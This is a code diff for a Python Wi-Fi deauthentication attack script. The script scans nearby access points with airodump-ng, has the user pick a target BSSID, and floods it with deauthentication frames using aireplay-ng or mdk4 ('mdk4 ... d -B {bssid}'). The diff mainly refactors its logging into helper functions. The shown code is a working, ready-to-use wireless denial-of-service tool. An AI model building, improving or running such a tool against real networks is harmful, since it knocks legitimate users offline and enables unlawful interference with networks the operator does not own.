@@ -14,10 +14,25 @@ init(autoreset=True)
 REQUIRED_CMDS = ["iw", "aireplay-ng", "ip", "mdk4", "xterm"]
 SHORTCUT_PATH = "/usr/local/bin/deauther-s"
 
+def ok(msg):
+    print(f"{Fore.GREEN}[+] {Fore.WHITE}{msg}")
+
+def err(msg):
+    print(f"{Fore.RED}[!] {Fore.WHITE}{msg}")
+
+def warn(msg):
+    print(f"{Fore.YELLOW}[!] {Fore.WHITE}{msg}")
+
+def info(msg):
+    print(f"{Fore.CYAN}[*] {Fore.WHITE}{msg}")
+
+def input_field(msg):
+    return input(f"{Fore.GREEN}[?] {Fore.WHITE}{msg}").strip()
+
 def check_superuser():
     """Return True if running as root, otherwise exit program."""
     if os.geteuid() != 0:
-        print(f"{Fore.RED}[!] {Fore.WHITE}This tool must be run as root!")
+        err("This tool must be run as root!")
         sys.exit(1)
     return True
 
@@ -25,7 +40,7 @@ def cleanup_tmp_files():
     tmp_files = [f for f in os.listdir("/tmp") if f.startswith("deauther")]
     for f in tmp_files:
         try:
-            print(f"{Fore.GREEN}[+] {Fore.WHITE}removeing temporary file: /tmp/{f}")
+            ok(f"removeing temporary file: /tmp/{f}")
             os.remove(os.path.join("/tmp", f))
         except:
             pass
@@ -36,14 +51,14 @@ def validate_interface(iface):
                       capture_output=True, timeout=5)
         return True
     except:
-        print(f"{Fore.RED}[!] {Fore.WHITE}Interface {iface} not found or not in monitor mode")
+        err(f"Interface {iface} not found or not in monitor mode")
         return False
 
 def check_dependencies():
     missing = [cmd for cmd in REQUIRED_CMDS if not shutil.which(cmd)]
     if missing:
-        print(f"{Fore.RED}[!] {Fore.WHITE}Missing dependencies: {', '.join(missing)}")
-        print(f"{Fore.YELLOW}[!] {Fore.WHITE}Please install them before continuing!")
+        err(f"Missing dependencies: {', '.join(missing)}")
+        warn(f"Please install them before continuing!")
         exit(1)
 
 def print_banner():
@@ -61,11 +76,11 @@ def uninstall_script():
     if os.path.islink(SHORTCUT_PATH):
         try:
             os.remove(SHORTCUT_PATH)
-            print(f"{Fore.GREEN}[+] {Fore.WHITE}Uninstalled successfully from {SHORTCUT_PATH}")
+            ok(f"Uninstalled successfully from {SHORTCUT_PATH}")
         except Exception as e:
-            print(f"{Fore.RED}[!] {Fore.WHITE}Failed to uninstall: {e}")
+            err(f"Failed to uninstall: {e}")
     else:
-        print(f"{Fore.YELLOW}[!] {Fore.WHITE}No installation found at {SHORTCUT_PATH}")
+        warn(f"No installation found at {SHORTCUT_PATH}")
     sys.exit(0)
 
 def start_deauth(bssid, channel, iface):
@@ -76,7 +91,7 @@ def start_deauth(bssid, channel, iface):
     print(f"{Fore.YELLOW}2. {Fore.RESET}mdk4 (stronger, faster, more aggressive)")
     print()
     
-    choice = input(f"{Fore.GREEN}[?] {Fore.WHITE}Choose Method: ").strip()
+    choice = input_field("Choose attack method (1-2): ")
 
     if choice == "1":
         tool = "aireplay"
@@ -85,14 +100,14 @@ def start_deauth(bssid, channel, iface):
         tool = "mdk4"
         cmd_str = f"mdk4 {iface} d -B {bssid} -s 9999"
     else:
-        print(Fore.RED + "[!] Invalid choice." + Style.RESET_ALL)
+        err("[!] Invalid choice." + Style.RESET_ALL)
         return
     
-    print(f"{Fore.GREEN}[+] {Fore.WHITE}Setting channel {channel} on interface {iface}...")
+    info(f"Setting channel {channel} on interface {iface}...")
     set_channel(iface, channel)
 
-    print(f"{Fore.GREEN}[+] {Fore.WHITE}Attacking {bssid} using interface {iface} with {tool}...")
-    print(f"{Fore.GREEN}[+] {Fore.WHITE}Press CTRL+C to stop the attack...")
+    info(f"Attacking {bssid} using interface {iface} with {tool}...")
+    info(f"Press CTRL+C to stop the attack...")
 
     cmd = [
         "xterm",
@@ -108,7 +123,7 @@ def start_deauth(bssid, channel, iface):
         p = subprocess.Popen(cmd)
         p.wait()
     except KeyboardInterrupt:
-        print(f"\n{Fore.GREEN}[+] {Fore.WHITE}Attack stopped by user.")
+        ok(f"Attack stopped by user.")
     finally:
         if p:
             try:
@@ -116,14 +131,14 @@ def start_deauth(bssid, channel, iface):
             except:
                 pass
         
-        print(f"{Fore.GREEN}[+] {Fore.WHITE}Attack stopped.")
+        ok(f"Attack stopped.")
 
 
 def set_channel(iface, channel):
     subprocess.run(["iw", iface, "set", "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def run_airodump_scan(iface):
-    print(f"{Fore.GREEN}[+] {Fore.WHITE}Launching airodump-ng in xterm...")
+    info(f"Launching airodump-ng in xterm...")
 
     base = "/tmp/deauther_scan"
     csv_path = base + "-01.csv"
@@ -138,12 +153,12 @@ def run_airodump_scan(iface):
         # buka xterm di pojok kanan bawah (geometry: 100x30, offset negatif) dengan warna teks merah
         subprocess.run(["xterm", "-geometry", "100x30-0-0", "-e", "bash", "-lc", cmd])
     except Exception as e:
-        print(f"{Fore.RED}[!] {Fore.WHITE}Failed to launch airodump-ng: {e}")
+        err(f"Failed to launch airodump-ng: {e}")
         sys.exit(1)
 
     # cek file hasil
     if not os.path.exists(csv_path):
-        print(f"{Fore.RED}[!] {Fore.WHITE}CSV not generated! Expected at: {csv_path}")
+        err(f"CSV not generated! Expected at: {csv_path}")
         sys.exit(1)
 
     return csv_path
@@ -192,14 +207,14 @@ def interactive_choose(aps):
               f"{Fore.CYAN}BSSID:{bssid}")
 
     print()
-    choice = input(f"{Fore.GREEN}[?] {Fore.WHITE}Choose target number: ")
+    choice = input_field("Select target: ")
 
     try:
         choice = int(choice) - 1
         if choice < 0 or choice >= len(aps):
             raise ValueError
     except ValueError:
-        print(f"{Fore.RED}[!] {Fore.WHITE}Invalid choice!")
+        err(f"Invalid choice!")
         sys.exit(1)
 
     return aps[choice][0], aps[choice][1]
@@ -233,7 +248,7 @@ def main():
     aps = parse_airodump_csv(csv_file)
 
     if not aps:
-        print(f"{Fore.RED}[!] {Fore.WHITE}No APs found in scan!")
+        err(f"No APs found in scan!")
         return
 
     target_bssid, channel = interactive_choose(aps)
